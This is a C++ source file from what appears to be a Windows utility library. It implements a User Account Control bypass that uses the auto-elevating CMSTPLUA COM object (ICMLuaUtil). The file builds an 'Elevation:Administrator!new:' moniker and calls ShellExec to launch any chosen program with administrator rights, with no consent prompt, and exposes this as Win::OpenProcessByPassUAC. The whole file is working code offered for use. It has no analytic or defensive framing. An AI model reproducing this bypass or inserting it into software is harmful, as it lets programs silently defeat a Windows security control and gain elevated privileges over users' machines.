#include "stdafx.h"

namespace shared {

	typedef interface ICMLuaUtil ICMLuaUtil;
	typedef struct ICMLuaUtilVtbl {
		BEGIN_INTERFACE
			HRESULT(STDMETHODCALLTYPE* QueryInterface)(
				__RPC__in ICMLuaUtil* This,
				__RPC__in REFIID riid,
				_COM_Outptr_  void** ppvObject);
		ULONG(STDMETHODCALLTYPE* AddRef)(
			__RPC__in ICMLuaUtil* This);
		ULONG(STDMETHODCALLTYPE* Release)(
			__RPC__in ICMLuaUtil* This);
		HRESULT(STDMETHODCALLTYPE* Method1)(
			__RPC__in ICMLuaUtil* This);
		HRESULT(STDMETHODCALLTYPE* Method2)(
			__RPC__in ICMLuaUtil* This);
		HRESULT(STDMETHODCALLTYPE* Method3)(
			__RPC__in ICMLuaUtil* This);
		HRESULT(STDMETHODCALLTYPE* Method4)(
			__RPC__in ICMLuaUtil* This);
		HRESULT(STDMETHODCALLTYPE* Method5)(
			__RPC__in ICMLuaUtil* This);
		HRESULT(STDMETHODCALLTYPE* Method6)(
			__RPC__in ICMLuaUtil* This);
		HRESULT(STDMETHODCALLTYPE* ShellExec)(
			__RPC__in ICMLuaUtil* This,
			_In_     LPCWSTR lpFile,
			_In_opt_  LPCTSTR lpParameters,
			_In_opt_  LPCTSTR lpDirectory,
			_In_      ULONG fMask,
			_In_      ULONG nShow
			);
		HRESULT(STDMETHODCALLTYPE* SetRegistryStringValue)(
			__RPC__in ICMLuaUtil* This,
			_In_      HKEY hKey,
			_In_opt_  LPCTSTR lpSubKey,
			_In_opt_  LPCTSTR lpValueName,
			_In_      LPCTSTR lpValueString
			);
		HRESULT(STDMETHODCALLTYPE* Method9)(
			__RPC__in ICMLuaUtil* This);
		HRESULT(STDMETHODCALLTYPE* Method10)(
			__RPC__in ICMLuaUtil* This);
		HRESULT(STDMETHODCALLTYPE* Method11)(
			__RPC__in ICMLuaUtil* This);
		HRESULT(STDMETHODCALLTYPE* Method12)(
			__RPC__in ICMLuaUtil* This);
		HRESULT(STDMETHODCALLTYPE* Method13)(
			__RPC__in ICMLuaUtil* This);
		HRESULT(STDMETHODCALLTYPE* Method14)(
			__RPC__in ICMLuaUtil* This);
		HRESULT(STDMETHODCALLTYPE* Method15)(
			__RPC__in ICMLuaUtil* This);
		HRESULT(STDMETHODCALLTYPE* Method16)(
			__RPC__in ICMLuaUtil* This);
		HRESULT(STDMETHODCALLTYPE* Method17)(
			__RPC__in ICMLuaUtil* This);
		HRESULT(STDMETHODCALLTYPE* Method18)(
			__RPC__in ICMLuaUtil* This);
		HRESULT(STDMETHODCALLTYPE* Method19)(
			__RPC__in ICMLuaUtil* This);
		HRESULT(STDMETHODCALLTYPE* Method20)(
			__RPC__in ICMLuaUtil* This);
		END_INTERFACE
	} *PICMLuaUtilVtbl;
	interface ICMLuaUtil
	{
		CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl;
	};

	class CMLuaUtil final {
	public:
		const std::wstring CLSID_CMSTPLUA = LR"({3E5FC7F9-9A51-4367-9063-A120244FBEC7})";
		const std::wstring IID_ICMLuaUtil = LR"({6EDD6D74-C007-4E75-B76A-E5740995E24C})";
	public:
		inline bool OpenProgram(const std::wstring& procPathname, const std::wstring& parameters, const int& show_type = SW_SHOW);
	};

	inline bool CMLuaUtil::OpenProgram(const std::wstring& procPathname, const std::wstring& parameters, const int& show_type) {
		bool result = false;
		BIND_OPTS3 bind_opts3 = { 0 };
		WCHAR wszCLSID[MAX_PATH] = { 0 };
		WCHAR wszMonikerName[MAX_PATH] = { 0 };
		CLSID clsidICMLuaUtil = { 0 };
		IID iidICMLuaUtil = { 0 };
		ICMLuaUtil* pICMLuaUtil = nullptr;
		BOOL bRet = FALSE;
		HRESULT hr = ::CoInitialize(NULL);
		do {
			if (FAILED(hr))
				break;
			hr = ::CLSIDFromString(CLSID_CMSTPLUA.c_str(), &clsidICMLuaUtil);
			if (FAILED(hr))
				break;
			hr = ::IIDFromString(IID_ICMLuaUtil.c_str(), &iidICMLuaUtil);
			if (FAILED(hr))
				break;
			int nStrlen = ::StringFromGUID2(clsidICMLuaUtil, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0])));
			hr = ::StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L"Elevation:Administrator!new:%s", wszCLSID);
			if (FAILED(hr))
				break;
			bind_opts3.cbStruct = sizeof(bind_opts3);
			bind_opts3.hwnd = nullptr;
			bind_opts3.dwClassContext = CLSCTX_LOCAL_SERVER;
			hr = ::CoGetObject(wszMonikerName, &bind_opts3, iidICMLuaUtil, (PVOID*)(&pICMLuaUtil));
			if (FAILED(hr))
				break;
			hr = pICMLuaUtil->lpVtbl->ShellExec(pICMLuaUtil, procPathname.c_str(), parameters.c_str(), NULL, 0, show_type);
			if (FAILED(hr))
				break;
			result = true;
		} while (0);
		if (pICMLuaUtil) {
			pICMLuaUtil->lpVtbl->Release(pICMLuaUtil);
			pICMLuaUtil = nullptr;
		}
		::CoUninitialize();
		return result;
	}


	bool Win::OpenProcessByPassUAC(const std::string& procPathname, const std::string& parameters, const int& show_type /*= SW_SHOW*/) {
		bool result = false;
		do {
			if (!Win::AccessA(procPathname))
				break;
			CMLuaUtil _CMLuaUtil;
			result = _CMLuaUtil.OpenProgram(IConv::MBytesToWString(procPathname), IConv::MBytesToWString(parameters), show_type);
		} while (0);
		return result;
	}

}///namespace shared 